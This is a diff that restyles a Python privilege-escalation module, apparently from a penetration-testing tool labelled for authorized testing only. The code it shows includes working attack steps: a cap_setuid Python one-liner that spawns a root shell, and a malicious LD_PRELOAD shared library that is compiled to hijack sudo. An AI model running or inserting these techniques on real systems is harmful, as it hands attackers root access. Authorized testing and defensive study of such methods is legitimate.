@@ -3,19 +3,20 @@
 Linux 权限提升模块
 """
 
-from .suid_exploit import SUIDExploit
-from .sudo_bypass import SudoBypass
+import logging
+import os
+from typing import Any, Dict, List, Optional
+
 from ..base import (
     BasePrivilegeEscalation,
     EscalationConfig,
-    EscalationResult,
     EscalationMethod,
-    PrivilegeLevel,
+    EscalationResult,
     EscalationVector,
+    PrivilegeLevel,
 )
-from typing import Optional, List, Dict, Any
-import logging
-import os
+from .sudo_bypass import SudoBypass
+from .suid_exploit import SUIDExploit
 
 logger = logging.getLogger(__name__)
 
@@ -29,9 +30,9 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
     Warning: 仅限授权渗透测试使用！
     """
 
-    name = 'linux_privesc'
-    description = 'Linux Privilege Escalation Module'
-    platform = 'linux'
+    name = "linux_privesc"
+    description = "Linux Privilege Escalation Module"
+    platform = "linux"
     supported_methods = [
         EscalationMethod.SUID,
         EscalationMethod.SUDO,
@@ -75,9 +76,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
         result = enumerator.enumerate()
 
         if result.success:
-            self._vectors = [
-                EscalationVector(**v) for v in result.vectors
-            ]
+            self._vectors = [EscalationVector(**v) for v in result.vectors]
             return result.vectors
         else:
             return []
@@ -85,6 +84,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
     def escalate(self, method: Optional[EscalationMethod] = None) -> EscalationResult:
         """执行提权"""
         import time
+
         start_time = time.time()
         from_level = self.check_current_privilege()
 
@@ -116,7 +116,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
                     method=method,
                     from_level=from_level,
                     to_level=from_level,
-                    error=f"Unsupported method: {method.value}"
+                    error=f"Unsupported method: {method.value}",
                 )
 
             result.from_level = from_level
@@ -134,7 +134,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
                 from_level=from_level,
                 to_level=from_level,
                 error=str(e),
-                duration=time.time() - start_time
+                duration=time.time() - start_time,
             )
 
     def _exploit_capability(self) -> EscalationResult:
@@ -144,10 +144,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
         try:
             # 查找具有危险 capability 的二进制
             result = subprocess.run(
-                ['getcap', '-r', '/'],
-                capture_output=True,
-                text=True,
-                timeout=30
+                ["getcap", "-r", "/"], capture_output=True, text=True, timeout=30
             )
 
             if result.returncode != 0:
@@ -156,17 +153,17 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
                     method=EscalationMethod.CAPABILITY,
                     from_level=self.current_level,
                     to_level=self.current_level,
-                    error="getcap command failed"
+                    error="getcap command failed",
                 )
 
             # 解析结果，寻找可利用的 capability
             exploitable = {
-                'cap_setuid': self._exploit_cap_setuid,
-                'cap_dac_override': self._exploit_cap_dac_override,
-                'cap_sys_admin': self._exploit_cap_sys_admin,
+                "cap_setuid": self._exploit_cap_setuid,
+                "cap_dac_override": self._exploit_cap_dac_override,
+                "cap_sys_admin": self._exploit_cap_sys_admin,
             }
 
-            for line in result.stdout.strip().split('\n'):
+            for line in result.stdout.strip().split("\n"):
                 if not line:
                     continue
 
@@ -180,7 +177,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
                 method=EscalationMethod.CAPABILITY,
                 from_level=self.current_level,
                 to_level=self.current_level,
-                error="No exploitable capabilities found"
+                error="No exploitable capabilities found",
             )
 
         except Exception as e:
@@ -189,34 +186,31 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
                 method=EscalationMethod.CAPABILITY,
                 from_level=self.current_level,
                 to_level=self.current_level,
-                error=str(e)
+                error=str(e),
             )
 
     def _exploit_cap_setuid(self, binary: str) -> EscalationResult:
         """利用 cap_setuid capability"""
-        import subprocess
         import shlex
+        import subprocess
 
         # 如果是 Python - 安全方式: 使用参数列表避免 shell=True
-        if 'python' in binary:
+        if "python" in binary:
             # 验证 binary 路径安全性
-            if not binary.startswith('/') or '..' in binary:
+            if not binary.startswith("/") or ".." in binary:
                 return EscalationResult(
                     success=False,
                     method=EscalationMethod.CAPABILITY,
                     from_level=self.current_level,
                     to_level=self.current_level,
-                    error=f"Invalid binary path: {binary}"
+                    error=f"Invalid binary path: {binary}",
                 )
 
             python_code = 'import os; os.setuid(0); os.system("/bin/sh")'
-            cmd_list = [binary, '-c', python_code]
+            cmd_list = [binary, "-c", python_code]
             try:
                 result = subprocess.run(
-                    cmd_list,
-                    shell=False,  # 安全: 禁用 shell
-                    capture_output=True,
-                    timeout=10
+                    cmd_list, shell=False, capture_output=True, timeout=10  # 安全: 禁用 shell
                 )
                 return EscalationResult(
                     success=True,
@@ -224,7 +218,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
                     from_level=self.current_level,
                     to_level=PrivilegeLevel.SYSTEM,
                     output=f"Exploited {binary} with cap_setuid",
-                    evidence=f"Binary: {binary}"
+                    evidence=f"Binary: {binary}",
                 )
             except (subprocess.TimeoutExpired, OSError, ValueError) as e:
                 logger.debug(f"Capability exploit attempt failed: {e}")
@@ -234,7 +228,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
             method=EscalationMethod.CAPABILITY,
             from_level=self.current_level,
             to_level=self.current_level,
-            error=f"Failed to exploit cap_setuid on {binary}"
+            error=f"Failed to exploit cap_setuid on {binary}",
         )
 
     def _exploit_cap_dac_override(self, binary: str) -> EscalationResult:
@@ -245,7 +239,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
             method=EscalationMethod.CAPABILITY,
             from_level=self.current_level,
             to_level=self.current_level,
-            error="cap_dac_override exploit not implemented"
+            error="cap_dac_override exploit not implemented",
         )
 
     def _exploit_cap_sys_admin(self, binary: str) -> EscalationResult:
@@ -255,7 +249,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
             method=EscalationMethod.CAPABILITY,
             from_level=self.current_level,
             to_level=self.current_level,
-            error="cap_sys_admin exploit not implemented"
+            error="cap_sys_admin exploit not implemented",
         )
 
     def _exploit_ld_preload(self) -> EscalationResult:
@@ -266,16 +260,11 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
 
         try:
             # 检查 sudo 是否保留 LD_PRELOAD
-            result = subprocess.run(
-                ['sudo', '-l'],
-                capture_output=True,
-                text=True,
-                timeout=10
-            )
+            result = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
 
-            if 'env_keep' in result.stdout and 'LD_PRELOAD' in result.stdout:
+            if "env_keep" in result.stdout and "LD_PRELOAD" in result.stdout:
                 # 创建恶意共享库
-                c_code = '''
+                c_code = """
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -286,25 +275,23 @@ void _init() {
     setgid(0);
     system("/bin/sh");
 }
-'''
-                with tempfile.NamedTemporaryFile(
-                    mode='w', suffix='.c', delete=False
-                ) as f:
+"""
+                with tempfile.NamedTemporaryFile(mode="w", suffix=".c", delete=False) as f:
                     f.write(c_code)
                     c_file = f.name
 
-                so_file = c_file.replace('.c', '.so')
+                so_file = c_file.replace(".c", ".so")
 
                 # 编译
                 subprocess.run(
-                    ['gcc', '-fPIC', '-shared', '-o', so_file, c_file, '-nostartfiles'],
+                    ["gcc", "-fPIC", "-shared", "-o", so_file, c_file, "-nostartfiles"],
                     capture_output=True,
-                    timeout=30
+                    timeout=30,
                 )
 
                 # 执行
                 env = os.environ.copy()
-                env['LD_PRELOAD'] = so_file
+                env["LD_PRELOAD"] = so_file
 
                 # 找一个可以 sudo 执行的命令
                 # ... 需要解析 sudo -l 输出
@@ -318,7 +305,7 @@ void _init() {
                     method=EscalationMethod.LD_PRELOAD,
                     from_level=self.current_level,
                     to_level=PrivilegeLevel.SYSTEM,
-                    output="LD_PRELOAD exploit successful"
+                    output="LD_PRELOAD exploit successful",
                 )
 
             return EscalationResult(
@@ -326,7 +313,7 @@ void _init() {
                 method=EscalationMethod.LD_PRELOAD,
                 from_level=self.current_level,
                 to_level=self.current_level,
-                error="LD_PRELOAD not preserved in sudo"
+                error="LD_PRELOAD not preserved in sudo",
             )
 
         except Exception as e:
@@ -335,7 +322,7 @@ void _init() {
                 method=EscalationMethod.LD_PRELOAD,
                 from_level=self.current_level,
                 to_level=self.current_level,
-                error=str(e)
+                error=str(e),
             )
 
     def _exploit_path_hijack(self) -> EscalationResult:
@@ -345,7 +332,7 @@ void _init() {
             method=EscalationMethod.PATH_HIJACK,
             from_level=self.current_level,
             to_level=self.current_level,
-            error="PATH hijack exploit requires specific conditions"
+            error="PATH hijack exploit requires specific conditions",
         )
 
     def _exploit_kernel(self) -> EscalationResult:
@@ -355,12 +342,12 @@ void _init() {
             method=EscalationMethod.KERNEL,
             from_level=self.current_level,
             to_level=self.current_level,
-            error="Kernel exploit requires specific vulnerability and exploit code"
+            error="Kernel exploit requires specific vulnerability and exploit code",
         )
 
 
 __all__ = [
-    'LinuxPrivilegeEscalation',
-    'SUIDExploit',
-    'SudoBypass',
+    "LinuxPrivilegeEscalation",
+    "SUIDExploit",
+    "SudoBypass",
 ]
